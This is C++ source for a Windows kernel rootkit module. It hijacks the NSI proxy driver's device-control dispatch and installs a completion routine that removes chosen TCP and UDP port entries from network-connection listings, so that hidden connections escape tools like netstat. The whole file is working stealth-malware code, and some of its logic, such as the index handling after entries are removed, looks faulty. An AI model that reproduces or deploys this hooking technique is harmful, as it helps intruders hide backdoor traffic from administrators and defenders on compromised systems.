#include "nsi.hpp"
#include "rootkit.hpp"

#define ntohs(s) \
    (((s >> 8) & 0x00FF) | \
    ((s << 8) & 0xFF00))

PDEVICE_OBJECT Rootkit::NetHook::PreviousDevice = nullptr;
PDRIVER_DISPATCH Rootkit::NetHook::PreviousDispatch = nullptr;
NetInfo Rootkit::NetHook::Net;

NTSTATUS NsiCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP pIrp, PVOID Context)
{
	using namespace Rootkit::NetHook;
	PNSI_PARAM nsiParam = static_cast<PNSI_PARAM>(pIrp->UserBuffer);

	if (nsiParam->Entries)
	{
		PNSI_TCP_ENTRY tcpEntries = (PNSI_TCP_ENTRY)nsiParam->Entries;
		PNSI_UDP_ENTRY udpEntires = (PNSI_UDP_ENTRY)nsiParam->Entries;
		PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParam->StatusEntries;
		PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParam->ProcessEntries;

		AutoLock lock(Net.Lock);

		for (DWORD i = 0; i < nsiParam->Count; i++)
		{
			if (nsiParam->Type == NSI_PARAM_TYPE::Tcp)
			{
				if (Utils::FindLTCP(ntohs(tcpEntries[i].Local.Port)))
				{
					RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
					if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NSI_STATUS_ENTRY));
					if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);

					nsiParam->Count--;
					i--;
				}

				if (Utils::FindRTCP(ntohs(tcpEntries[i].Remote.Port)))
				{
					RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
					if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NSI_STATUS_ENTRY));
					if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);

					nsiParam->Count--;
					i--;
				}
			}

			if (nsiParam->Type == NSI_PARAM_TYPE::Udp)
			{
				if (Utils::FindUDP(ntohs(udpEntires[i].Port)))
				{
					RtlMoveMemory(&udpEntires[i], &udpEntires[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
					if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NSI_STATUS_ENTRY));
					if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);

					nsiParam->Count--;
					i--;
				}
			}
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS Rootkit::NetHook::HookDeviceIo(IN PDEVICE_OBJECT DeviceObject, IN PIRP pIrp)
{
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(pIrp);

	if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_GETALLPARAM)
	{
		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool(NonPagedPool, sizeof(HOOKED_IO_COMPLETION));

		hook->OriginalCompletionRoutine = irpStack->CompletionRoutine;
		hook->OriginalContext = irpStack->Context;

		irpStack->Context = hook;
		irpStack->CompletionRoutine = NsiCompletionRoutine;

		hook->RequestingProcess = PsGetCurrentProcess();
		hook->InvokeOnSuccess = (irpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

		irpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}

	return PreviousDispatch(DeviceObject, pIrp);
}


NTSTATUS Rootkit::NetHook::HidePort(USHORT Port)
{
	NTSTATUS status = STATUS_SUCCESS;

#if DEBUG
	DbgPrint("[+] Hooking to NSI\n");
#endif

	UNICODE_STRING device_name{};
	PFILE_OBJECT pFile{};

	PDEVICE_OBJECT device;
	PFILE_OBJECT file_object{};
	PDRIVER_DISPATCH PreviousDispatch;

	RtlInitUnicodeString(&device_name, L"\\Device\\Nsi");

	status = IoGetDeviceObjectPointer(&device_name, FILE_READ_DATA, &pFile, &device);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Couldn't acquire nsiproxy driver pointer\n");
#endif
		return status;
	}

#if DEBUG
	DbgPrint("[!] Successfully hooked %wZ\n", &device->DriverObject->DriverName);
#endif

	Rootkit::NetHook::PreviousDevice = device;
	Rootkit::NetHook::PreviousDispatch = device->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	InterlockedExchange64(reinterpret_cast<LONG64*>(&(device->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG64>(HookDeviceIo));

	return status;
}

VOID Rootkit::NetHook::UnloadHook()
{
	InterlockedExchange64(reinterpret_cast<LONG64*>(&(Rootkit::NetHook::PreviousDevice->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL])), reinterpret_cast<LONG64>(Rootkit::NetHook::PreviousDispatch));
#if DEBUG
	DbgPrint("[+] Unhooked NSI hook\n");
#endif

	ObDereferenceObject(Rootkit::NetHook::PreviousDevice);

	LARGE_INTEGER wait_time;
	wait_time.QuadPart = -50 * 1000 * 1000;
	KeDelayExecutionThread(KernelMode, 0, &wait_time);
}